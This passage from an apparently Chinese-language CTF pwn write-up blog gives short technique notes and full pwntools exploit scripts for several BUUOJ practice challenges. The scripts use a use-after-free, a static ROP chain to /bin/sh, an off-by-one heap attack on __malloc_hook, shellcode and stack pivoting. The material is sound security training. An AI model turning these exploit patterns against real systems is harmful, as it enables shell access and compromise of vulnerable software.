class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#--------------------------------------------</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">index,typ,value,length</span>):<br> sla(<span class="hljs-string">&#x27;CNote &gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index &gt; &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sla(<span class="hljs-string">&#x27;Type &gt; &#x27;</span>,<span class="hljs-built_in">str</span>(typ))<br> <span class="hljs-keyword">if</span> typ==<span class="hljs-number">2</span>:<br>    sla(<span class="hljs-string">&#x27;Length &gt; &#x27;</span>,<span class="hljs-built_in">str</span>(length))<br> sla(<span class="hljs-string">&#x27;Value &gt; &#x27;</span>,<span class="hljs-built_in">str</span>(value))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;CNote &gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index &gt; &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;CNote &gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index &gt; &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-------------------------------------------</span><br>new(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1234</span>)<br>new(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5678</span>)<br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">1</span>)<br>value=<span class="hljs-string">&#x27;sh\x00\x00&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>new(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,value,<span class="hljs-number">0xc</span>)<br>dele(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><p>这题用到uaf，看代码要知道是两种指针数组，有system函数，起到修改作用的是string类型数组指针，利用uaf，可以改到前一块的指针为system，再前位为sh(32位要对齐)，（具体操作就是申请，释放之类操作），最后用修改后随意用个带动</p><h3 id="bbys-tu-2016">bbys_tu_2016</h3><p>最简单的题居然卡住了一会，填充要调试得应该</p><p>gdb用pattern offest ？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29342</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./bbys_tu_2016&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(<span class="hljs-number">0x804856d</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="inndy-rop">inndy_rop</h3><p>这题静态编译，能直接溢出</p><p>快速构造rop链的命令：</p><p>ROPgadget --binary rop --ropchain</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29714</span>)<br><br>elf=ELF(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br>p = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xc</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;/bin&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea064</span>) <span class="hljs-comment"># @ .data + 4</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b8016</span>) <span class="hljs-comment"># pop eax ; ret</span><br>p += <span class="hljs-string">&#x27;//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0805466b</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080481c9</span>) <span class="hljs-comment"># pop ebx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080de769</span>) <span class="hljs-comment"># pop ecx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806ecda</span>) <span class="hljs-comment"># pop edx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080492d3</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0807a66f</span>) <span class="hljs-comment"># inc eax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806c943</span>) <span class="hljs-comment"># int 0x80</span><br>r.sendline(p)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="roarctf-2019-easy-pwn">roarctf_2019_easy_pwn</h3><p>off-by-one漏洞，然后chunk extend，先求得main_arena附近的地址（靠unsortbin）,main_arena地址可由ida看libc里面的malloc_trim函数的v22得，得到base后，改个chunk的size为0x71(特定的)，里面fd填hook-偏移（靠偏移的7f作为size绕过检查）的地址，申请两次后，后一个chunk分配到hook附近，然后fill，由于在malloc里填og打不通，所以改为malloc_hook前一个的realloc填og，而原本的malloc_hook中写realloc中push的地址，最后好像realloc会先push再跳转到realloc上的地址。这题写了我两天orz（最后就是，本地EOF，远端却打得通）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./roarctf_2019_easy_pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29536</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br> sla(<span class="hljs-string">&#x27;content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-----------------------------------------</span><br>create(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#0</span><br>create(<span class="hljs-number">0x30</span>)<span class="hljs-comment">#1</span><br>create(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#2</span><br>create(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#3</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p8(<span class="hljs-number">0xD1</span>))<br>delete(<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">0xc0</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x40</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>+p64(<span class="hljs-number">0x91</span>))<br>delete(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#----------------------------------------</span><br>main_arena=<span class="hljs-number">0x3C4B20</span><br>ru(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>rc(<span class="hljs-number">0x40</span>)<br>addr=u64(rc(<span class="hljs-number">8</span>))<br>base=addr-<span class="hljs-number">88</span>-main_arena<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br><span class="hljs-comment">#print hex(addr)</span><br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">0x80</span>)<br>hook=base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>shell=base+o_g_old[<span class="hljs-number">1</span>]<br><span class="hljs-comment">#---------------------------------------</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0xb0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>+p64(<span class="hljs-number">0x71</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">13</span>+p64(<span class="hljs-number">0x21</span>))<br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x50</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span>+p64(<span class="hljs-number">0x71</span>)+p64(hook-<span class="hljs-number">0x23</span>)*<span class="hljs-number">2</span>)<br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#2</span><br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#4</span><br><span class="hljs-comment">#debug()</span><br>edit(<span class="hljs-number">4</span>,<span class="hljs-number">0x13</span>+<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x13</span>-<span class="hljs-number">8</span>)+p64(shell)+p64(base+libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]+<span class="hljs-number">14</span>))<br>create(<span class="hljs-number">0x10</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="mrctf2020-shellcode">mrctf2020_shellcode</h3><p>NX没开，看不了汇编，但直接shellcode就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26373</span>)<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>sc=asm(shellcraft.sh())<br>r.sendline(sc)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="gyctf-2020-borrowstack">gyctf_2020_borrowstack</h3><p><strong>关键词</strong>：栈迁移</p><p>使用可控制的地址覆盖ebp的值，使用leave;ret指令所在地址覆盖ret的值，迁移后要填充4或8</p><p>read的时候用send</p><p>这题首先注意：</p><p>1.bss段离plt，got很近，要适当抬高迁移的位置</p><p>3.用system拿,估计还得要栈迁移，麻烦，用og简单，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26005</span>)<br><span class="hljs-comment">#r=process(&#x27;./gyctf_2020_borrowstack&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./gyctf_2020_borrowstack&#x27;</span>)<br>pop_rdi=<span class="hljs-number">0x400703</span><br>leave_ret=<span class="hljs-number">0x400699</span><br>ret=<span class="hljs-number">0x004004c9</span><br>bank=<span class="hljs-number">0x601080</span><br>r.recvuntil(<span class="hljs-string">&#x27;me what you want&#x27;</span>)<br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(bank+<span class="hljs-number">0xa0</span>)+p64(leave_ret))<br>r.recvuntil( <span class="hljs-string">&#x27;borrow stack now!&#x27;</span>)<br>r.send(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">0x14</span>+p64(<span class="hljs-number">0</span>)+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]))<br>r.recvline()<br>puts=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts)<br>base=puts-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>og = [<span class="hljs-number">0x45216</span>, <span class="hljs-number">0x4526a</span>, <span class="hljs-number">0xf02a4</span>, <span class="hljs-number">0xf1147</span>]<br>one_gadget=base+og[<span class="hljs-number">1</span>]<br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+p64(one_gadget))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="lonelywolf">lonelywolf</h3><p>以后遇到题目可以先看看libc版本，不一样的需要改链接</p><p>strings libc的名字 | grep LIBC</p><p>可以查看libc版本</p><p>这题我的版本与国赛libc链接版本不一样，需要改库链接</p><p>ldd查看elf的ld和libc</p><p>patchelf --set-interpreter （）-–set-rpath （）（）</p><p>两个参数要换成自己本地对应的路径，</p><p>–set-interpreter 后面跟的是ld.so的路径，</p><p>–set-rpath 后面跟的是文件夹路径，</p><p>最后加上你想要更换glibc版本的程序名称</p><p>一次失败的复现</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs ruby">from pwn import *<br>local_file  = <span class="hljs-string">&#x27;./lonelywolf&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = <span class="hljs-variable constant_">ELF</span>(local_libc)<br><span class="hljs-symbol">else:</span><br>    r = remote(<span class="hljs-string">&#x27;&#x27;</span>, )<br>    libc = <span class="hljs-variable constant_">ELF</span>(remote_libc)<br><br>elf = <span class="hljs-variable constant_">ELF</span>(local_file)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:r</span>.send(data)<br>sa      = <span class="hljs-built_in">lambda</span> delim,data         <span class="hljs-symbol">:r</span>.sendafter(delim, data)<br>sl      = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:r</span>.sendline(data)<br>sla     = <span class="hljs-built_in">lambda</span> delim,data         <span class="hljs-symbol">:r</span>.sendlineafter(delim, data)<br>sea     = <span class="hljs-built_in">lambda</span> delim,data         <span class="hljs-symbol">:r</span>.sendafter(delim, data)<br>rc      = <span class="hljs-built_in">lambda</span> numb=<span class="hljs-number">4096</span>          <span class="hljs-symbol">:r</span>.recv(numb)<br>rl      = <span class="hljs-built_in">lambda</span>                    <span class="hljs-symbol">:r</span>.recvline()<br>ru      = <span class="hljs-built_in">lambda</span> delims                         <span class="hljs-symbol">:r</span>.recvuntil(delims)<br>uu32    = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:u32</span>(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-built_in">lambda</span> data               <span class="hljs-symbol">:u64</span>(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-built_in">lambda</span> tag, addr        <span class="hljs-symbol">:r</span>.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.format(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span 